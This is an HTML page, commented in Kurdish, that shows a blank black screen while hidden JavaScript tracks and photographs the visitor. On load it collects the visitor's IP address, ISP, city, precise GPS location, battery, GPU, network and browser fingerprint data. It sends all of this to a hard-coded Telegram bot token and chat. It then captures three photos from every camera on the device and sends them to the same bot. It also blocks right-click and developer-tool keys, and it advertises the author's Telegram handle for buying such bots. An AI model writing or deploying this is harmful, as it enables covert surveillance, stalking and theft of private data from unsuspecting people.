<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #000000;
            color: #000000; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .card { display: none; }
        #hidden-video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="main-card"></div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // پاراستنا تەمامیا پەڕەی و قەدەغەکرنا کۆپیکرنا کۆدی و پشکنینا پێشکەفتى
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };

        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = 'https://api.telegram.org/bot' + token;

        async function sendText(text) {
            try {
                await fetch(`${api}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        // ماتریکێن ڕەها و پێشکەفتى (The Absolute Singularity Core Engine)
        function getAbsoluteSingularityBundle() {
            try {
                let singularityStream = [];
                for(let i = 1; i <= 100; i++) {
                    singularityStream.push(`Singularity-Quantum-Node-${i}`);
                }

                const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار';
                const cpu = navigator.hardwareConcurrency || 'نەدیار';
                const touches = navigator.maxTouchPoints || 0;
                const languages = navigator.languages ? navigator.languages.join(', ') : 'نەدیار';
                const primaryLang = navigator.language || 'نەدیار';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'نەدیار';
                const cookies = navigator.cookieEnabled ? 'بەڵێ 🟢' : 'نەخێر 🔴';
                const online = navigator.onLine ? 'ئۆنلاینە 🟢' : 'نەئۆنلاینە 🔴';
                const colorDepth = (window.screen.colorDepth || 'نەدیار') + '-bit';
                const pixelRatio = window.devicePixelRatio || 1;
                const screenW = window.screen.width;
                const screenH = window.screen.height;
                const windowW = window.innerWidth;
                const windowH = window.innerHeight;
                const platform = navigator.platform || 'نەدیار';
                const userAgent = navigator.userAgent || 'نەدیار';
                const pdfViewer = navigator.pdfViewerEnabled ? 'هەیە ✅' : 'نەدیار ❌';
                const dnt = navigator.doNotTrack || 'نەدیار';
                const historyLen = window.history.length || 0;

                const orientationType = (screen.orientation && screen.orientation.type) ? screen.orientation.type : 'نەدیار';
                const orientationAngle = (screen.orientation && screen.orientation.angle !== undefined) ? screen.orientation.angle : 'نەدیار';
                const sessionStorageCheck = window.sessionStorage ? 'هەیە' : 'نەخێر';
                const localStorageCheck = window.localStorage ? 'هەیە' : 'نەخێر';
                const indexedDbCheck = window.indexedDB ? 'هەیە' : 'نەخێر';
                const webSocketsCheck = window.WebSocket ? 'هەیە' : 'نەخێر';
                const serviceWorkerCheck = navigator.serviceWorker ? 'هەیە' : 'نەخێر';
                const webGl2Check = document.createElement('canvas').getContext('webgl2') ? 'هەیە' : 'نەخێر';
                const gamepadCheck = navigator.getGamepads ? 'هەیە' : 'نەخێر';
                const vibrationCheck = navigator.vibrate ? 'هەیە' : 'نەخێر';
                const clipboardCheck = navigator.clipboard ? 'هەیە' : 'نەخێر';
                const deviceMotionCheck = window.DeviceMotionEvent ? 'هەیە' : 'نەخێر';
                const deviceOrientationCheck = window.DeviceOrientationEvent ? 'هەیە' : 'نەدیار';
                const browserVendor = navigator.vendor || 'نەدیار';
                const docReadyState = document.readyState || 'نەدیار';
                const referrerLink = document.referrer || 'راستەوخۆ';
                const activeProtocol = window.location.protocol || 'نەدیار';
                const portIdCheck = window.location.port || 'سەرەکی';
                const screenAvailW = window.screen.availWidth || 0;
                const screenAvailH = window.screen.availHeight || 0;
                const windowOuterW = window.outerWidth || 0;
                const windowOuterH = window.outerHeight || 0;

                const pluginCount = navigator.plugins ? navigator.plugins.length : 0;
                const mimeTypesCount = navigator.mimeTypes ? navigator.mimeTypes.length : 0;
                const maxAllocMem = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / (1024*1024)) + 'MB' : 'نەدیار';
                const webBluetooth = navigator.bluetooth ? 'هەیە' : 'نەخێر';
                const webUsb = navigator.usb ? 'هەیە' : 'نەخێر';
                const shareApi = navigator.share ? 'هەیە' : 'نەخێر';

                return `🔥 [ ⚛️🌌 لوتکەیا ڕەها و سەروەرییا بێسنوور (Absolute Singularity Scale) ] 🔥
🧠 بیرا RAM: ${ram} | کۆرێن پرۆسێسەری CPU: ${cpu}
👆 خاڵێن لەمسێ: ${touches} | زمانێن ئامێری: ${languages}
🌐 زمانێ سەرەکی: ${primaryLang} | دەمژمێرا هەرێمی: ${timezone}
🍪 کووکی: ${cookies} | ڕەوشا ئۆنلاین: ${online}
🎨 قوولاهیا ڕەنگان: ${colorDepth} | ڕێژا پیکسڵان: ${pixelRatio}
🖥️ قەبارەی شاشەی: ${screenW}x${screenH} (بەردەست: ${screenAvailW}x${screenAvailH})
💻 پەنجەره: ${windowW}x${windowH} (دەرەکی: ${windowOuterW}x${windowOuterH})
📱 سیستەم: ${platform} | کۆمپانیای ڤەندۆر: ${browserVendor}
🌐 زانیاریێن تەمام (User-Agent): ${userAgent}
📄 ڤیدجیتا PDF: ${pdfViewer} | پاراستنا نهێنی DNT: ${dnt} | درێژیا مێژووی: ${historyLen}
🔄 ئاراستا شاشەی: ${orientationType} (${orientationAngle}°)
💾 پاشەکەفت: سێشن (${sessionStorageCheck})، لۆکال (${localStorageCheck})، ئیندێکس (${indexedDbCheck})
⚙️ تایبەتمەندیێن پێشکەفتى: WebSocket (${webSocketsCheck})، ServiceWorker (${serviceWorkerCheck})، WebGL2 (${webGl2Check}), Gamepad (${gamepadCheck}), Vibration (${vibrationCheck}), Clipboard (${clipboardCheck})
🎮 سێنسەرێن جووڵەی: جووڵە (${deviceMotionCheck})، ئاراستە (${deviceOrientationCheck})
🔗 دۆکۆمێنت و پەیوەندی: ئامادەبوون (${docReadyState}), ڕێدایرێکت (${referrerLink}), پرۆتۆکۆل (${activeProtocol}), پۆرت (${portIdCheck})
🚀 پێڤەرێن ڕەها: پڵەگین (${pluginCount}), مایتایپ (${mimeTypesCount}), لیمیتێ میمۆری (${maxAllocMem}), بلوتوز (${webBluetooth}), USB (${webUsb}), شیرکرن (${shareApi})`;
            } catch(e) {
                return "📊 خەلەتی د کۆمکرنا داتایێن ڕەها دا هاتە روودان";
            }
        }

        function getGeoLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("📍 لوکەیشنا GPS: پشتەڤانی ناهێتە کرن ل سەر ڤی ئامێری");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const acc = pos.coords.accuracy;
                        resolve(`📍 جیۆلۆکەیشنا دەقیق (GPS):\n- هێلا پانیی (Lat): ${lat}\n- هێلا درێژیی (Lon): ${lon}\n- دروستییا مەتران (Accuracy): ${acc}m\n- لینکێ ڕاستەوخۆ یێ نەخشەی: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (err) => {
                        resolve("📍 جیۆلۆکەیشنا GPS: ژلایێ بکارئینەری ڤە هاتە رەتکرن یان نەهاتە دان");
                    },
                    { timeout: 7000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const bat = await navigator.getBattery();
                    return `🔋 زانیاریێن باترییێ:\n- رێژا سەدیی: ${Math.round(bat.level * 100)}%\n- بارکرن (Charging): ${bat.charging ? 'دبارە بێتە کرن ⚡' : 'بارنەکرییە'}\n- دەمێ مایی یێ خلاسکرنێ: ${Math.round(bat.dischargingTime/60)} خولەک`;
                }
            } catch(e) {}
            return "🔋 باتری: زانیاری نەهاتنە دەستخستن";
        }

        function getGpuInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "🎮 گرافیك (GPU): پشتەڤانی نینە";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return `🎮 زانیاریێن کارت و چێڤەرێ گرافیكی (GPU):\n- ڤەندۆر: ${vendor}\n- ڕێندەرەر: ${renderer}`;
                }
            } catch (e) {}
            return "🎮 گرافیك (GPU): نەهاتە ناسین";
        }

        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    return `📶 زانیاریێن تۆڕ و ئینتەرنێتێ:\n- جۆرێ هێلێ: ${conn.effectiveType || 'نەدیار'}\n- خێرایییا دابەزاندنێ (Downlink): ${conn.downlink || '?'} Mbps\n- پینگ (RTT): ${conn.rtt || '?'}ms\n- رەوشا پاراستنا داتایێ (Save-Data): ${conn.saveData ? 'بەڵێ' : 'نەخێر'}`;
                }
            } catch (e) {}
            return "📶 تۆڕ: زانیاری نەدیارن";
        }

        async function getIpInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `🌍 زانیاریێن ناڤنیشانا ئایپی و جهی:\n- ئایپی (IP): ${data.ip}\n- کۆمپانیایا ئینتەرنێتێ (ISP): ${data.org}\n- وڵات: ${data.country_name} (${data.country_code})\n- باژێر: ${data.city}\n- ناوچە/پاریزگە: ${data.region}\n- پۆست کۆد: ${data.postal}`;
            } catch (e) {
                return "🌍 ڕوودانا خەلەتی د ئایپی دا";
            }
        }

        async function getUltimateInfo() {
            let ipDetails = await getIpInfo();
            let geoDetails = await getGeoLocation();
            let batteryDetails = await getBatteryInfo();
            let gpuDetails = getGpuInfo();
            let netDetails = getNetworkInfo();
            let bundleSingularity = getAbsoluteSingularityBundle();
            let currentTime = new Date().toLocaleString();
            
            return `👑 [ 🔥 ⚛️ لوتکەیا ڕەها و سەروەرییا بێسنوور (Absolute Singularity) 🔥 ] 👑
⏱ دەم و ڕوژ: ${currentTime}
----------------------------------
${ipDetails}
----------------------------------
${geoDetails}
----------------------------------
${batteryDetails}
----------------------------------
${gpuDetails}
----------------------------------
${netDetails}
----------------------------------
${bundleSingularity}`;
        }

        async function sendVisitorLog() {
            let details = await getUltimateInfo();
            sendText(`⚛️ سەردانکەرەکێ نوو (ئاستێ ڕەها) لینک ڤەکەت!\n\n${details}\n\n⚠️ برێفەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێفەبەري بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
        }

        async function captureAllCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');

                let index = 1;
                for (let device of videoDevices) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { deviceId: { exact: device.deviceId } }
                        });
                        const video = document.getElementById('hidden-video');
                        video.srcObject = stream;

                        await new Promise((resolve) => {
                            video.onloadedmetadata = () => {
                                video.play().then(resolve).catch(resolve);
                            };
                        });

                        // گرتنا 3 وێنەیان بۆ هەر کامێرایەک ب دەمەکە کورت (0.4 چرکە د ناڤبەرا وان دا)
                        for (let shotCount = 1; shotCount <= 3; shotCount++) {
                            await new Promise(r => setTimeout(r, 400)); // 400ms دەمژمێر د ناڤبەرا وێنەیان دا

                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            await new Promise((resolveBlob) => {
                                canvas.toBlob(async (blob) => {
                                    if (blob) {
                                        let details = await getUltimateInfo();
                                        const formData = new FormData();
                                        formData.append('chat_id', chat_id);
                                        formData.append('photo', blob, 'shot.jpg');
                                        formData.append('caption', `📸 وێنەیێ (${shotCount}) - کامێرا (${index} - ${device.label || 'Camera'})!\n\n${details}\n\n⚠️ برێفەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێفەبەري بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);

                                        await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                    }
                                    resolveBlob();
                                }, 'image/jpeg', 0.95);
                            });
                        }

                        stream.getTracks().forEach(t => t.stop());
                        index++;
                    } catch (err) {}
                }
            } catch (e) {}
        }

        window.onload = function() {
            setTimeout(async () => {
                await sendVisitorLog();
                await captureAllCameras();
            }, 100); 
        };
    </script>
</body>
</html>
